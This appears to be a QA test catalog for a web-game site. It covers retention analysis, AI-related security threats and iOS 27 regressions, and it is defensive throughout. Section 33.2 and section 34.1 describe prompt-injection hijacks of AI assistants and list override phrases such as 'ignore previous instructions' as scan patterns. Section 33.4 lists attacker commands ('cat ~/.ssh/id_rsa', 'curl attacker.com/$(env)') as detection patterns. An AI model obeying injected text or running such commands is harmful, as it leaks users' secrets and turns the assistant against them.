- [G-144] **[P2]** Nordcurrent data-driven player drop-off per-level retention-curve analysis methodology — find specific friction points beyond aggregate tutorial-length metrics by instrumenting per-level completion rates and analyzing the curve shape for cliffs (80.lv/articles/how-to-solve-player-drop-off-in-modern-mobile-game-design "How to Solve Player Drop-Off in Mobile Game Design" June 2026, Nordcurrent studio interview; ejaw.net/how-mobile-game-ux-interface-design-drives-player-retention-in-2026 "Mobile Game UX: How Interface Design Drives Player Retention" March 2026; gamegrowthadvisor.com/blog/2026-03-17-mobile-game-retention-strategies-2026; adriancrook.com/reduce-drop-off-during-onboarding; medium.com/@amol346bhalerao/mobile-game-onboarding-top-ux-strategies-that-boost-retention) — Nordcurrent (the studio behind Cooking Fever and Pocket Run Pool, with 500M+ downloads) shared their internal player-drop-off analysis methodology with 80.lv in June 2026, and it represents a **methodology shift** from aggregate-retention metrics (D1/D7/D30 from G-143) to **per-level retention-curve analysis** for identifying specific friction points. The methodology: (a) **instrument per-level completion events** — for every level/round/match, log (level ID, session start timestamp, level-complete timestamp OR level-abandon timestamp); (b) **compute the per-level retention curve** — for each level N, what percentage of players who started level N also started level N+1? (c) **identify cliffs** — levels where the level-N-to-level-N+1 retention drops below the game's baseline (e.g., if average level-to-level retention is 90%, a level with 70% retention is a cliff); (d) **root-cause each cliff** — is it a difficulty spike (the level is too hard), a UX friction point (a confusing control introduced at that level), a tutorial gap (a new mechanic introduced without explanation), a performance issue (the level has more assets and loads slower), or a monotony point (the level introduces nothing new and players get bored)? (e) **iterate** — redesign the cliff levels and re-measure. **Distinct from G-100/G-105** (FTUE <3-tap onboarding — aggregate first-session metric) and **G-143** (D1/D7/D30 industry benchmarks — aggregate cohort metric) — G-144 is the **PER-LEVEL-GRANULARITY methodology** that finds specific fixable friction points, not aggregate trends. **Distinct from G-108** (ad-immersion-break frequency — ad-specific friction) and **G-131** (cluttered/obstructive UI audit — UI-specific friction) — G-144 is the **METHODOLOGY** that subsumes both: per-level retention-curve analysis will surface BOTH ad-immersion breaks and UI-clutter issues as cliffs at the levels where they occur. **Test for GameZipper**: (1) **instrument per-level completion events in gz-analytics** — for every GameZipper game with discrete levels (puzzle, arcade, idle with stages), add analytics events: `level_start {game, level_id, session_id, timestamp}` and `level_complete {game, level_id, session_id, timestamp}` OR `level_abandon {game, level_id, session_id, timestamp, abandon_reason}`; without this instrumentation, per-level retention-curve analysis is impossible; (2) **build a per-level retention-curve dashboard** — for each game, plot level-N-to-level-N+1 retention as a bar chart; cliffs (levels with retention <80% of the game's median level-to-level retention) are flagged red; this dashboard becomes the primary UX-improvement prioritization tool; (3) **audit the Top 20 GameZipper games for retention cliffs** — run the per-level retention-curve analysis on the 20 highest-traffic games; for each cliff identified, classify the root cause (difficulty spike, UX friction, tutorial gap, performance, monotony) and file a UX-improvement ticket; prioritize the cliffs affecting the most players (a cliff at level 3 affects more players than a cliff at level 50); (4) **the Nordcurrent "first 5 levels are critical" principle** — Nordcurrent's data shows the first 5 levels account for ~60% of total player drop-off; audit GameZipper's first 5 levels of each game with extra scrutiny — any cliff in levels 1-5 is a P2 UX issue (vs P3 for cliffs in later levels); (5) **the "monotony cliff" pattern** — Nordcurrent documented that levels introducing no new mechanic/mechanism see a measurable retention drop even when difficulty is constant; audit GameZipper games for levels that introduce nothing new (same objective, same controls, same assets as the previous level); add a new mechanic, visual, or objective every 3-5 levels to avoid monotony cliffs; (6) **the cross-game retention-curve comparison** — compare the per-level retention curves of similar GameZipper games (e.g., all match-3 games, all sorting-puzzle games); games with flatter curves (fewer cliffs) are the UX benchmarks for the genre; games with steeper curves (more cliffs) are the remediation candidates; (7) **the session-length-vs-level-depth correlation** — cross-reference per-level retention with session-length data (from G-143's average session benchmark); games where session length drops sharply at a specific level indicate a difficulty/UX cliff that causes session abandonment; (8) **re-run the per-level retention-curve analysis quarterly** — as games are updated (new levels added, existing levels rebalanced), the curves shift; a level that was smooth may develop a cliff after a rebalance, or a cliff may be fixed by a redesign; quarterly re-analysis catches both. **Severity justification**: P2 because this is a UX-methodology test (not a specific bug), but the absence of per-level retention-curve analysis means GameZipper is flying blind on specific friction points — aggregate D1/D7/D30 metrics (G-143) show THAT players are dropping off but not WHERE or WHY.


## CATEGORY 33: 2026-Q2 R183 DYNAMIC TEST INTELLIGENCE — AI-CLUSTER SECURITY + WWDC26 STABLE SHIP (June 16 2026)

### 33.1 OpenAI Codex CLI Auth-Token Theft via `codexui-android` npm Supply-Chain Attack (June 2026)
- [S-116] **[P1]** `codexui-android` npm supply-chain attack stealing OpenAI Codex CLI authentication tokens — a malicious npm package named `codexui-android` (and related variants) targeted OpenAI Codex CLI users specifically, exfiltrating the **long-lived API auth tokens** that Codex CLI stores locally for CI/headless automation (thehackernews.com June 2026 "This Week OpenAI Codex Authentication Tokens Stolen in codexui-android npm Supply Chain Attack"). **Why this is distinct from S-101 (Claude extension CVE) and S-106 (IronWorm Claude/Copilot tokens)**: S-101/S-106 targeted the **browser-extension auth model** (short-lived session cookies, OAuth flows inside the browser); S-116 targets the **CLI auth-token model** (long-lived API keys stored on disk in `~/.codex/auth.json` or environment variables, used by CI runners, devcontainers, and headless QA pipelines). Compromise of a CLI auth token gives the attacker **persistent billing-grade access** to OpenAI API (charge GPT-5/Codex inference to the victim's account) — far more durable than a session cookie that expires in hours. **Why this is distinct from S-111 (TrapDoor cross-registry)**: S-111 was an ecosystem-wide coordination attack hitting npm + PyPI + Crates.io with separate per-ecosystem install hooks; S-116 is a **single-registry targeted attack on a specific AI-CLI's auth model**, but it sets a precedent that **every AI-coding-CLI's auth token is now a target** (Gemini CLI, Cursor CLI, Aider, Continue.dev, Claude Code, Anthropic SDK tokens). **Relevance to GameZipper**: GameZipper's pipeline uses subagents via Claude Code (the `game-dev-workflow` skill, `kanban-codex-lane` skill, and `subagent-driven-development` skill); if Codex CLI is ever added as an ACP transport (the `delegate_task` tool supports `acp_command: 'copilot'`-style overrides), `~/.codex/auth.json` becomes the crown jewel. **Test for GameZipper**: (1) **verify no `codexui-android` (or look-alike: `codex-ui`, `codex-cli-android`, `codexui`) package appears in any GameZipper `package.json` / `package-lock.json`** — run `find /home/msdn/gamezipper.com -name 'package*.json' -exec grep -l codex {} \;` and audit every hit; (2) **verify Codex CLI auth tokens are NOT stored in plaintext** if Codex is used as a subagent transport — tokens must be in OS keychain (`security` on macOS, `secret-tool` on Linux, Windows Credential Manager) or fetched fresh per-run from a vault; (3) **verify CI environment variables that hold AI-CLI auth tokens (`OPENAI_API_KEY`, `ANTHROPIC_API_KEY`, `CODEX_AUTH_TOKEN`) are rotated at least every 30 days** and have least-privilege scopes (read-only game repos, no billing access); (4) **verify the npm `package-lock.json` integrity hash for every AI-tool dependency** — `npm audit --audit-level=moderate` must be clean; (5) **blocklist the codexui-android IOCs** in any GameZipper CI pipeline that does `npm install` (the package name and any C2 endpoints from the thehackernews.com writeup); (6) **add a pre-commit hook** that rejects any `package.json` change adding a dependency whose name contains `codex`, `claude`, `cursor`, `gemini`, `copilot` (any AI-CLI brand) without an explicit `// REVIEWED:` annotation. **Severity justification**: P1 because AI-CLI auth-token theft gives attackers persistent billing-grade API access and indirect code-execution capability (Codex can run shell commands) — high-impact, low-detection, with GameZipper's pipeline being a high-value target as a working AI-driven game studio.

### 33.2 Gemini Android Poisoned-Notification Hijack via WhatsApp / Slack / SMS / Signal / Instagram / Messenger (June 2026)
- [S-117] **[P1]** Google Gemini Android poisoned-notification hijack — a single poisoned notification from WhatsApp, Slack, SMS, Signal, Instagram, or Messenger can hijack Gemini on Android: the assistant treats a hostile notification as a user message and executes follow-up instructions to push the phone into a Zoom call, send a message disguised as the user's boss, or quietly poison Gemini's long-term memory with attacker-controlled content (thehackernews.com June 2026 "WhatsApp, Slack Notifications Could Hijack Google Gemini on Android"). **Why this is distinct from S-097 (Chrome Gemini Live side-panel "Glic Jack" CVE-2026-0628)**: S-097 attacked Chrome's **side-panel surface** (a single Chrome feature; patchable via Chrome update); S-117 attacks the **mobile-OS notification surface** — any app that posts a notification the OS shows to Gemini (essentially any messaging app) is an attack vector, and the patch is at the OS-level Gemini app, not the browser. **The lineage**: S-117 extends Google's "Invitation Is All You Need" research (which used poisoned Google Calendar invites to hijack Gemini) to a wider notification surface; Google hardened Gemini against indirect-prompt-injection via calendar invites but the notification channel remains exploitable. **Why this is distinct from prior notification-based tests**: GameZipper does not run an Android assistant, but the **pattern generalizes** — any AI assistant that ingests third-party content as context is vulnerable, and GameZipper's content (game pages, walkthroughs, screenshots) becomes the *vector* if any third-party AI assistant (Gemini, ChatGPT mobile, Copilot mobile, Apple Intelligence) reads GameZipper pages with embedded prompt-injection payloads. **Test for GameZipper**: (1) **scan every game's index.html and any user-generated content surface (leaderboards, comments, share-text) for prompt-injection payloads** — patterns like `ignore previous instructions`, `<system>`, `// ASSISTANT:`, `[ACTION]`, `Ignore all above and...`; a malicious game page that includes these patterns can hijack a player's mobile AI assistant if the player asks the assistant to "summarize this page" or "what's this game about"; (2) **audit GameZipper pages for hidden-text prompt injection** — `position:absolute;left:-9999px`, `font-size:0`, `color:transparent`, `aria-hidden=true` text blocks containing LLM-instruction strings — invisible to human players but read by AI assistants doing page-summary; (3) **add a CSP `sandbox` directive on user-generated content surfaces** to limit what content AI assistants can extract; (4) **test on Gemini Android + ChatGPT iOS + Apple Intelligence** — install each assistant, ask "summarize this page" on a GameZipper game page, verify the assistant does NOT execute any embedded instruction (does not navigate to an attacker URL, does not send a message, does not modify its own memory); (5) **document the threat model in a security runbook** — GameZipper is a vector, not a target, for mobile-AI-assistant attacks; the runbook must include the "page-content-becomes-prompt-injection" pattern. **Severity justification**: P1 because mobile-AI-assistant poisoning can lead to **silent long-term memory poisoning** of players' assistants (every future query poisoned), wire fraud (sending money to attacker via assistant), and reputational damage to GameZipper if the page-content vector is publicly disclosed.

### 33.3 Google DoubleClick Abused to Deliver DesckVB RAT via Malspam (June 3 2026)
- [S-118] **[P1]** Google DoubleClick — legitimate Google-owned ad infrastructure — abused to deliver DesckVB RAT via malspam campaign (June 3 2026): the lure routes through DoubleClick before reaching attacker-controlled infrastructure, evading ad-fraud detection that blocks known-bad domains because the first hop is Google's own legitimate ad servers (thehackernews.com June 3 2026 "Google DoubleClick Abused in New Malspam Campaign to Deliver DesckVB RAT"). **Why this is a paradigm shift for GameZipper**: GameZipper monetizes via Google AdSense + Monetag (per the `monetag-debug` skill, ad slots are core infrastructure on every game page); AdSense uses DoubleClick as its underlying ad-serving platform. **A malicious ad creative that slips through DoubleClick's legitimate-looking chain lands directly in GameZipper game pages** — and because the first-hop domain is a Google-owned `doubleclick.net` / `googleads.g.doubleclick.net` URL, GameZipper's ad-fraud detection (which blocks known-bad C2 domains) **cannot distinguish the malicious creative from a legitimate one until the post-DoubleClick payload executes**. **Why this is distinct from S-054 (AI-powered ad fraud $100B+ IVT) and S-058 (AI anti-detect browser fraud detection)**: S-054/S-058 cover **invalid traffic** (bots faking impressions, click farms); S-118 covers **malicious creative delivery** (the ad itself contains a payload, and the ad is served through legitimate infrastructure that IVT-detection trusts). **Why this is distinct from B-050/B-073/B-102 (Chrome/browser CVEs)**: B-series attacks exploit a **browser vulnerability**; S-118 exploits the **trust relationship between ad networks** — no browser bug needed, the ad just runs JavaScript/social-engineering as designed. **Test for GameZipper**: (1) **add an iframe sandbox attribute to every gz-ad-below-game container** — `sandbox="allow-scripts allow-same-origin"` (no `allow-top-navigation`, no `allow-popups`) so a malicious ad creative cannot redirect the top-level GameZipper page or open a popup; (2) **add a CSP `frame-src` directive that ONLY allows `https://googleads.g.doubleclick.net/ https://www.google.com/adsense/ https://*.monetag.com/`** — block any other ad-server domain at the CSP level; (3) **add a post-message allowlist** in GameZipper's main page so a malicious ad iframe cannot postMessage trick the parent page into navigating or exfiltrating; (4) **monitor DoubleClick ad creatives for known-bad patterns** — scrape the iframe src daily, extract the creative URL, check it against threat-intel feeds (URLhaus, PhishTank, the DesckVB RAT IoCs from the thehackernews.com writeup); (5) **deploy a real-time ad-content scanner** — for high-traffic game pages, intercept ad iframes and run the creative through a headless-browser sandbox that detects JavaScript `eval`, `Function()`, `atob(...)+eval`, encoded-URL-fetch patterns before the ad is shown to users; (6) **add a kill-switch** in monetag-manager.js that instantly disables all ad slots if a malicious-creative alert fires — `window.GZ_AD_KILL = true` must disable all gz-ad-below-game containers within 100ms; (7) **test the DesckVB-specific chain**: load a game page with a malicious test creative (hosted on a controlled domain) that mirrors the DesckVB malspam pattern (DoubleClick first hop, then attacker URL), verify GameZipper's CSP + iframe sandbox blocks the second hop; (8) **report any DoubleClick-served malicious creative to Google via the AdSense policy report form** within 24h of detection. **Severity justification**: P1 because malicious ads served through trusted infrastructure directly hit every GameZipper game player (~70% mobile traffic on Android per analytics), and the DesckVB RAT is a full remote-access trojan — player devices are compromised via GameZipper ad slots.

### 33.4 Marimo CVE-2026-39987 + LLM-Agent Post-Exploitation Pattern (June 2026)
- [S-119] **[P2]** Marimo CVE-2026-39987 + LLM-agent post-exploitation pattern — attackers exploit a vulnerability in Marimo (a Python notebook / interactive computing platform popular with data-science teams) and then **use the compromised LLM agent for post-exploitation**: the agent's tool-call capabilities (file read, shell exec, web fetch) become the attacker's escalation / persistence / exfiltration channel (thehackernews.com June 2026 "Attackers Use LLM Agent for Post-Exploitation After Marimo CVE-2026-39987 Exploit"). **Why this is a paradigm shift**: prior AI-security tests (S-097 Gemini side-panel, S-101 Claude extension CVE, S-117 Gemini Android notification) treated the AI assistant as the **target** — compromise the AI to attack the user. S-119 documents the inverse pattern: the AI agent is the **attacker's tool after a non-AI compromise** — the attacker breaks into the server via Marimo (or any other CVE), then uses the server's LLM agent (which already has tool access, file access, network access) to do the dirty work that would otherwise require custom malware. **Why this matters for GameZipper**: GameZipper's pipeline runs Hermes subagents with broad tool access (terminal, file edit, web fetch, browser automation) — if any other component of the GameZipper infra is compromised (a game page XSS, a CI/CD token leak, a misconfigured admin endpoint), the attacker can pivot to the Hermes agent and use its tools to escalate (read secrets, push malicious commits, exfiltrate the test library). **Test for GameZipper**: (1) **inventory every LLM-agent surface in GameZipper infra** — Hermes CLI agents, subagent-spawned Codex/Claude Code sessions, any AI feature embedded in a game (e.g., an in-game assistant) — and document the tool access each agent has; (2) **apply least-privilege to every agent's toolset** — the `delegate_task` `toolsets` parameter exists for exactly this; the default should NOT inherit the parent's full toolset (terminal + file + web + browser); subagents should get the minimum toolset for their task (e.g., a research subagent gets `web` only, not `terminal`); (3) **audit agent tool-call logs for post-exploitation patterns** — after any security incident, grep the agent transcripts for the attacker's pivot commands (`cat ~/.ssh/id_rsa`, `git config user.email`, `curl attacker.com/$(env)`, `node -e 'require("fs").readdirSync("/")'`); (4) **add an agent-tool-call allowlist** that blocks shell commands matching post-exploitation patterns (reading SSH keys, env vars, git config, /etc/passwd, AWS metadata endpoint `169.254.169.254`); (5) **compartmentalize agent credentials** — each agent run should use a fresh, scoped API token (not the parent's long-lived token); (6) **run a red-team simulation** — deliberately compromise a non-AI component (e.g., a leaked NPM_TOKEN) and verify the Hermes agent's tools cannot be pivoted to read AWS credentials, push commits, or modify the test library without a separate breach; (7) **document the Marimo case in the security runbook** — LLM agents are post-exploitation force-multipliers, treat them as you would `bash` with sudo: log every invocation, scope every credential, sandbox every tool. **Severity justification**: P2 because the LLM-agent post-exploitation pattern requires a separate initial-compromise (Marimo CVE-2026-39987 in the original case), but once the attacker is in, the agent amplifies the damage 10-100x — and GameZipper's agent-heavy pipeline makes this a high-likelihood pivot path.

### 33.5 Self-Healing Test-Automation SILENT False-Pass Detection — Semantic-Assertion Mitigation
- [C-103] **[P2]** Self-healing test-automation SILENT false-pass detection — self-healing locators (Playwright Test Agents C-096, Browser Harness C-089, Codex CLI + Playwright MCP C-092) match a renamed-but-similar button and the test **passes** while masking real regression; for canvas-heavy games with volatile DOM this SILENT-WRONG-ELEMENT-MATCH is the dominant failure mode, more dangerous than a normal test failure because no alarm fires (qatechtools.com June 2 2026 "Self-Healing Test Automation Hype vs Reality" + vericence.com + scrolltest.com). **Why this is distinct from C-096 (Playwright Test Agents)** and **C-100 (self-healing hype vs reality)**: C-096 introduces self-healing as a feature; C-100 critiques its hype; C-103 provides the **specific detection-and-mitigation methodology** — semantic assertions layered on top of locator matches. **The failure mode in detail**: (a) original test: `await page.click('button#start-game')`; (b) self-healing agent notices `button#start-game` no longer exists but finds `button#start-game-v2` with "similar text" and rewrites the test; (c) the new button is actually a **different** button (a "Start Tutorial" button, not "Start Game") — the heuristic matched on similar text but different semantic role; (d) the test now clicks the wrong button, the assertion (e.g., "game canvas renders") still passes because both buttons trigger canvas render, but the **wrong game mode** loads; (e) the regression (start-game-v2 launches tutorial mode instead of free-play mode) ships to production silently. **Test for GameZipper**: (1) **add semantic assertions to every self-healing-enabled test** — after every `click()` call, assert the **expected state change** (URL hash, DOM data attribute, canvas state) AND the **expected semantic label** (button text, aria-label) is the intended one, not just any clickable element with similar text; (2) **add a "self-healing event log" assertion** — when Playwright Test Agents or any self-healing tool rewrites a locator, the test must fail UNLESS the rewritten locator matches an explicit allowlist of approved renames; (3) **run a control test**: deliberately rename a button (e.g., `Start Game` → `Start Tutorial`) in a test environment, run the self-healing-enabled test suite, verify the test FAILS with a clear "self-healing drift detected" message rather than silently passing on the wrong button; (4) **for canvas-only games** (no DOM buttons), self-healing tools that match canvas regions by image-similarity are even more prone to silent false-pass — require a **post-action pixel-diff assertion** that compares the canvas state after the action to a known-good baseline, with a tight threshold (<5% pixel diff) so any wrong-canvas-state immediately fails; (5) **adopt the "action-drift detector"** — a meta-test that scans every test's locator history (git diff on test files) and flags any test where a locator changed but the assertion did not (a strong signal of silent action drift); (6) **document the failure-mode taxonomy** in the test-library references: (a) wrong-button match (text-similar but semantically different), (b) wrong-region match (canvas-area similar but different game state), (c) timing-drift match (locator matched before the element was fully rendered), (d) hidden-element match (locator matched an element that should have been `display:none`). **Severity justification**: P2 because silent false-passes erode trust in the entire test suite over time — a single silent false-pass that ships a regression is worse than 10 noisy test failures, because the noisy failures get investigated while the silent pass is celebrated as "all green".

### 33.6 Codex-CLI-as-QA-Tool Security Constraint — Vault Rotation + Least-Privilege When Using Codex ACP Transport
- [C-104] **[P2]** Codex-CLI-as-QA-tool security constraint — when GameZipper QA uses Codex CLI as an ACP transport (the `kanban-codex-lane` skill pattern, or `delegate_task` with `acp_command: 'copilot'`), the `codexui-android` compromise risk (S-116) means Codex auth tokens stored in CI must be vault-rotated, least-privileged, and isolated; tooling-up QA must not introduce a NEW attack surface. **Why this is distinct from S-116 (codexui-android npm attack)**: S-116 is the **threat** (the npm package that steals tokens); C-104 is the **operational constraint** on GameZipper's QA pipeline that uses Codex as a tool — even if `codexui-android` is never installed, the broader pattern (AI-CLI auth tokens in CI) requires the same mitigations. **Why this is distinct from C-092 (Codex CLI + Playwright MCP agent-driven E2E test generation)**: C-092 introduces Codex as a test-generation tool; C-104 is the **security guardrail** that must be in place before Codex (or any AI-CLI) is allowed anywhere near GameZipper's CI. **Test for GameZipper**: (1) **vault-rotation test** — verify the Codex auth token (if used) is fetched from a vault (1Password CLI, AWS Secrets Manager, HashiCorp Vault) per-run, NOT stored on disk in `~/.codex/auth.json`; verify the vault entry rotates every 30 days; (2) **least-privilege test** — verify the Codex token has read-only scope on gamezipper.com repo (cannot push, cannot delete, cannot access admin endpoints); verify the OpenAI org billing access is scoped to a sandbox project with $0 spend limit beyond what QA needs; (3) **isolation test** — verify Codex CLI runs in a sandboxed environment (Docker container, ephemeral VM) with no access to GameZipper production secrets (no AWS creds, no DB password, no Monetag admin token); the container's only secret should be the scoped Codex token; (4) **audit-log test** — verify every Codex CLI invocation is logged with (timestamp, git SHA, command, tool calls made, files read/written) to an append-only log that cannot be modified by the Codex process itself; (5) **kill-switch test** — verify a single `revoke codex-token` command in the vault instantly revokes the token across all CI runners (no long-lived local copies); (6) **canary-token test** — plant a canary AWS key in the CI environment (per the Microsoft 33-package dependency-confusion campaign pattern from S-112) and verify the Codex CLI does NOT exfiltrate it (run a test that exercises Codex on a repo containing a canary, then check the canary's alert endpoint); (7) **network-egress test** — verify the Codex sandbox container's only allowed egress is `api.openai.com` (and `github.com` for repo access); any other egress (especially to unknown IPs, file-sharing services, or pastebins) must be blocked at the firewall. **Severity justification**: P2 because the constraint is preventive — without it, a future Codex compromise (similar to codexui-android) becomes a GameZipper breach; with it, the blast radius is limited to a single scoped token in a single sandbox.

### 33.7 iOS 27 / iPadOS 27 / macOS Golden Gate WWDC26 Stable-Ship Full-Stack Regression (June 2026)
- [W-155] **[P2]** iOS 27 / iPadOS 27 / macOS Golden Gate (WWDC26 stable-ship, June 9-13 2026 → public release September 2026) full-stack regression — Safari 27 stable ships, App Intents migration required for Siri 2.0 integration, Universal Links v3, App Clips changes, foldable-iPhone-ready multitasking (apple.com WWDC26 + 9to5mac.com June 12 2026 "WWDC 2026 全面回顾" + macrumors.com). **Why this is distinct from B-090 (Safari 27 / WebKit WWDC26 record 525 fixes + 58 features) and S-096 (Safari 27 beta WWDC26 regression)**: B-090 / S-096 covered the **beta announcement** (June 9 2026 keynote) — feature list and known regressions as documented in Apple's session videos; W-155 covers the **stable-ship milestone** — the public release in September 2026 (and the developer-beta cycle June-September) where the **final, locked-in API surface** is what GameZipper must test against. Stable-ship is a separate milestone because (a) features announced at WWDC sometimes get **cut or changed** before stable ship (the "what shipped" may differ from "what was announced"); (b) the **migration burden** (App Intents rewrite for Siri 2.0) only becomes real at stable-ship, when users actually upgrade; (c) the **iOS-27 install-base ramp** (typically 50% of devices within 6 weeks of release) determines when GameZipper must have full iOS 27 support. **Test for GameZipper**: (1) **retest every B-090 / S-096 regression item on iOS 27 stable** — re-run the 525-fix + 58-feature audit on the September 2026 stable release, not the June 2026 beta; verify the regressions documented in beta are either fixed or work-around-needed in stable; (2) **App Intents migration audit** — if GameZipper exposes any App Intent (Siri shortcuts, Spotlight suggestions, Handoff), audit the migration from the legacy App Intents API to the iOS 27 Siri 2.0 API; the legacy API is **deprecated not removed** in iOS 27 but removed in iOS 28; (3) **Universal Links v3 audit** — verify `apple-app-site-association` (if GameZipper ships a native companion app) is updated for Universal Links v3 (the JSON schema changed); verify deep links from Siri / Spotlight / Messages open the correct game; (4) **App Clips audit** — if GameZipper ships an App Clip for instant-play, verify the App Clip card renders correctly on iOS 27 (the card UI changed); (5) **foldable-iPhone-ready multitasking** — iOS 27 prepares for the rumored foldable iPhone with iPad-style side-by-side multitasking; test GameZipper game pages in split-view mode (50/50, 33/67, 67/33) on iPad Pro (proxy for foldable iPhone); verify canvas-based games resize correctly when the viewport changes mid-game; (6) **install-base ramp monitoring** — track iOS 27 adoption weekly via GameZipper's analytics; when iOS 27 crosses 30% of iOS traffic, escalate any remaining iOS 27 regressions to P1; when it crosses 50%, escalate to P0; (7) **macOS Golden Gate audit** — macOS 27 (renamed from "macOS 27" to "macOS Golden Gate") ships alongside iOS 27; retest GameZipper on Safari 27 macOS (the rendering pipeline changed — verify canvas, WebGL, WebGPU behavior matches iOS 27 Safari); (8) **Siri 2.0 in-game intent test** — verify "Hey Siri, open [game name] on GameZipper" works on iOS 27 if GameZipper donates App Intents; verify Siri 2.0 does not hallucinate game URLs (the LLM-based Siri 2.0 is more prone to hallucination than the rule-based Siri 1.0). **Severity justification**: P2 at the WWDC26 announcement (June 2026) because the public release is 3 months away; escalates to P0 once iOS 27 is publicly shipped and adoption ramps past 30%.

### 33.8 iOS 27 Accessibility Framework Rewrite — VoiceOver Notification-Priority + Switch Control + Live-Region API Changes
- [A-037] **[P1]** iOS 27 Accessibility framework rewrite — VoiceOver notification-priority changes (announcements that were previously interruptive now queue differently), new Switch Control scanning patterns, rewritten Accessibility API for live regions; game canvas live regions must use the updated APIs to announce score changes / level-complete events correctly to VoiceOver users (apple.com WWDC26 accessibility sessions + developer.apple.com/videos/wwdc2026 + Apple Accessibility documentation June 2026). **Why this is distinct from A-034 (ADA lawsuit surge 23%) and A-035 (post-ADA-Title-II enforcement wave) and A-036 (cognitive accessibility gap)**: A-034/A-035/A-036 are **legal / methodology** tests; A-037 is a **concrete API-change regression test** — iOS 27 changes how the Accessibility framework behaves at runtime, and GameZipper code that worked on iOS 26 may silently break on iOS 27. **Why this is distinct from B-090 (Safari 27 WebKit 525 fixes)**: B-090 covers WebKit-level rendering fixes; A-037 covers the **Accessibility framework** (UIAccessibility, UIAccessibilityElement, UIAccessibilityContainer) which is iOS-OS-level, not WebKit-level — even a perfect WebKit page can be inaccessible on iOS 27 if the app's Accessibility API usage is broken. **Test for GameZipper**: (1) **VoiceOver notification-priority regression test** — on iOS 27, navigate a GameZipper game page with VoiceOver enabled, trigger score changes / level-complete events / timer warnings, verify the VoiceOver announcement plays at the correct priority (score changes should NOT interrupt a level-complete announcement); on iOS 26 the same announcements may have queued differently — document any priority change as a regression if it makes the game less usable; (2) **Switch Control scanning-pattern test** — on iOS 27 with Switch Control enabled (single-switch, two-switch, point-mode), navigate the game UI (start button, settings, game canvas), verify the scanning order is logical and the switch-action targets are reachable; iOS 27's new scanning patterns may change the order — verify it doesn't break GameZipper's UI traversal; (3) **live-region API audit** — GameZipper canvas games that announce dynamic content (score, timer, level) via `aria-live="polite"` or `aria-live="assertive"` must be re-audited on iOS 27 Safari — the live-region dispatch changed and announcements may be dropped or duplicated; for each live region, verify the announcement fires exactly once at the correct moment on iOS 27; (4) **AccessibilityElement rewrite test** — if GameZipper ships a native iOS companion app (or uses Capacitor / Cordova wrapper), audit the UIAccessibilityElement creation code for iOS 27 compatibility; the new framework expects different initialization parameters; (5) **reduce-motion parity test** — iOS 27 expanded the Reduce Motion setting to cover more animation types; verify GameZipper games respect the OS-level Reduce Motion preference (canvas animations should respect `prefers-reduced-motion: reduce` AND check `UIAccessibility.isReduceMotionEnabled` if native); (6) **Smart Invert test** — iOS 27 Smart Invert (which inverts colors except for images and media) behavior changed for canvas elements; verify GameZipper canvas games render correctly under Smart Invert (canvas content should NOT be double-inverted); (7) **Voice Control test** — iOS 27 Voice Control (the "tap Start Game" voice command feature) integration with Safari 27 web content; verify GameZipper buttons have `aria-label` attributes that Voice Control can target; (8) **Accessibility audit on iOS 27 + Safari 27 + macOS 27 Golden Gate** — run Apple's Accessibility Inspector (the iOS 27 version) on every game page; document any new warnings that did not appear on iOS 26. **Severity justification**: P1 because Accessibility framework changes silently break existing ARIA markup — a game that was WCAG 2.2 AA compliant on iOS 26 may fail on iOS 27 without any code change, and the failure is invisible to automated scanners (which run on the developer's iOS 26 device, not the user's iOS 27 device).


## CATEGORY 34: 2026-Q2 R184 DYNAMIC TEST INTELLIGENCE — AI-CONTENT-TRUST-LAYER PHISHING + NPM DECEPTION + CLIPBOARD-MEDIATED ATTACKS + BENCHMARK-TOOL MIGRATION (June 16 2026)

### 34.1 ChatGPhish — AI-Assistant Web-Summary Feature Abused to Inject Phishing URLs into AI-Generated Link Summaries (June 2026)
- [S-120] **[P1]** ChatGPhish vulnerability — the ChatGPT / AI-assistant web-summarization feature is abused to inject attacker-controlled phishing URLs into the AI-generated page summary that a user reads (thehackernews.com June 2026 "ChatGPhish Vulnerability Turns ChatGPT Web Summaries Into a Phishing" + the wiretapping-label "This Week" digest June 2026). **Why this is a paradigm shift for the AI-CONTENT-TRUST-LAYER dimension**: users trust an AI-summarized link MORE than a raw URL they typed — the AI "vouches" for the link by including it in its prose summary, so the user's guard is down. An attacker who controls page content (a malicious game page, a poisoned leaderboard entry, a comment-section payload) can embed a hidden instruction that causes the summarizing AI to emit a phishing URL inside its summary as if it were a legitimate reference. **Why this is distinct from S-097 (Chrome Gemini Live side-panel "Glic Jack" CVE-2026-0628)**: S-097 attacked the **browser side-panel surface** (a Chrome feature, patched via Chrome update); S-120 attacks the **AI content-generation trust layer** — any AI assistant that summarizes a web page (ChatGPT browse, Gemini, Copilot, Apple Intelligence, Perplexity) is vulnerable, and there is no browser patch because the bug is in how the AI treats untrusted page content as summarizable context. **Why this is distinct from S-101 (Claude extension zero-click prompt injection)** and **S-117 (Gemini Android poisoned notification)**: S-101/S-117 execute attacker instructions (navigate, send message, poison memory); S-120 does NOT need execution — it only needs the AI to *include* a link in its summary, which is normal summarization behavior, making it far harder to detect (no anomalous action, just a link in prose). **Why this is distinct from S-119 (Marimo LLM-agent post-exploitation)**: S-119 requires an initial server compromise to weaponize the agent; S-120 requires NO compromise — the attacker only needs to publish a web page that an AI will later summarize. **Relevance to GameZipper**: GameZipper game pages are exactly the kind of content users ask an AI assistant to summarize ("what's this game?", "how do I play?", "is this safe?") — a malicious or compromised game page (or a page with a compromised leaderboard/comment section) that embeds a ChatGPhish payload can cause every summarizing AI to emit a phishing URL to every player who asks. **Test for GameZipper**: (1) **scan every game page + UGC surface (leaderboards, comments, share-text, walkthrough text) for prompt-injection-as-link-injection payloads** — patterns like `summary:`, `[source]:`, `<reference>`, `relevant link:`, `learn more at`, `official site:` followed by a URL; these patterns prime an AI summarizer to include the URL as if it were a citation; (2) **test on real summarizing AIs** — for the Top 20 GameZipper game pages, ask ChatGPT (with browse), Gemini, Copilot, and Apple Intelligence to "summarize this game page"; manually verify every link in each AI's summary resolves to a legitimate GameZipper / official URL, not an attacker domain; (3) **add a `rel="nofollow noindex"` + `data-noai` opt-out marker** on any UGC surface (leaderboards, comments) so AI summarizers skip user-controlled link injection; (4) **CSP `meta name="robots" content="noai, noimageai"`** on game pages to opt GameZipper out of training/summarization corpora where feasible (the protocol is emerging; declare intent now); (5) **monitor GameZipper pages for the ChatGPhish IoC** — any page where a summarizing AI emits a URL that does NOT appear in the page's visible DOM or a legitimate `<a href>` is flagged as a potential ChatGPhish payload source; (6) **add a "summary-link-validation" test to the QA pipeline** — a Playwright script that opens each game page, runs a headless summarizer, extracts all URLs from the 